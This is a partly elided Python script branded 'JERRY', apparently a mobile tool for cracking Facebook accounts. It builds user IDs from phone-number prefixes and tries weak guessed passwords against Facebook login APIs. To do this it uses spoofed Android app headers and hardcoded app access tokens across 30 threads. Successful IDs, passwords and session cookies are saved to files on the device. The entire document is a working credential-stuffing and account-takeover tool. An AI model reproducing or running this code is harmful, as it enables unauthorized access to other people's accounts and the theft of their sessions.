...
-------------------------------------------
 ...
 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 : Jerry
 𝗦𝗧𝗔𝗧𝗨𝗦    : Free
  𝗩𝗘𝗥𝗦𝗜𝗢𝗡  : 1.0 \033[1;41m
 ok ids will be saved in Jerry folder
--------------------------------------------""")
def linex():
        print('\033[1;42m-------------𝗝𝗘𝗥𝗥𝗬-------------')
def clear():
        os.system('clear')
        print(logo)
loop=0
...
def menu():
        try:
                ...
                if 1==1:
                        ...
                        linex()
                        xd=input('\033[1;33m[?] Choice : ')
                        if xd in ['1','01']:
                                clear()
                                file = input('\033[1;33m[-] Enter File : ')
                                try:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print("\033[1;33m CRACKING STARTED JUST WAIT AND SEE")
                                        linex()                                        
                                        for user in fo:
...
def pak():
                user=[]
                clear()
                print('\033[1;31m Code example: 92306,92315,92335,92345')
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'123456','khan1122','khan12345','khan123','khan123456','khankhan123']
...
def indo():
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        linex()
                        print(f'\033[1;37m JAHAZ ON KRAIN')
                        linex()
                        for psx in user:
                                ids = code+psx
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [JERRY_BRAND-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': '[FBAN/FB4A;FBAV/268.0.0.7.121;FBBV/210375804;FBDM/{density=2.625,width=1080,height=2069};FBLC/en_US;FBRV/0;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N975U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
...
def api(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [JERRY_BRAND-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        headers={
                                ...
                                'User-Agent': '[FBAN/FB4A;FBAV/268.0.0.7.121;FBBV/210375804;FBDM/{density=2.625,width=1080,height=2069};FBLC/en_US;FBRV/0;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N975U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]',
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [JR-OK] '+ids+' | '+pas+'\033[1;97m')
                                        ...
                                        if 'y' in pcp:
                                                print(f'\r\r\033[1;96m[JR-CP] '+ids+' | '+pas+'\033[1;96m')
...
def api1(ids,names,passlist):
        try:
                global oks,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [JEERY_BRAND-M3] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[JR-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error_msg']:
                                        if 'y' in pcp:
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [JERRY_BRAND] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',	'6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']
                        ...
                        headers={
                                ...
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent': '[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681886;FBDM/{density=3.0,width=1080,height=1920};FBLC/uk_UA;FBRV/213212609;FBCR/Vodafone UA;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [JR-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                                        print(f'\r\r\x1b[38;5;46m|COOKIE|-> {cookie} ')
                                        open('/sdcard/JR-OK.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print(f'\r\r\033[1;96m[JR-CP] '+str(uid)+' | '+pas+'\033[1;96m')
                                        open('/sdcard/JR-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
